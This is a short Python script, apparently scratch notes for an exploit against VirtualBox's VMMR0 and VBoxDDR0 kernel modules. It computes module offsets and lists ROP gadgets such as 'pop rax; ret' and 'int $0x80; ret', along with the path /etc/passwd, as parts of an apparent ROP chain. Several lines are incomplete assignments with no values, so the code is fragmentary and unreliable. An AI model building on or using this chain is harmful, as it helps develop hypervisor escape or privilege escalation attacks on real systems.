#!/usr/bin/python3

VMMR0 = 0xffffffffa0903020 - 0xffffffffa08e6020
VboxDDR0 = 0xffffffffa0a02020 - 0xffffffffa09e5020
print(VMMR0)
print(VboxDDR0)
'''
# Finally restore the base pointer
poprbp =  # pop %rbp; ret
pushrsp =  # push %rsp; ret
int80ret = VMMR0 + 0x1f85c # int $0x80; ret
0x5a # rax
popret = VMMR0 + 0x1f7bd # pop rax; ret
/etc/passwd

# Build string
poprbp =  # pop %rbp; ret
pushrsp =  # push %rsp; ret
0x0 # rbp
0x0 # rdi
poppopret = VboxDDR0 + 0xdba # pop rdi; pop rbp; ret
'''
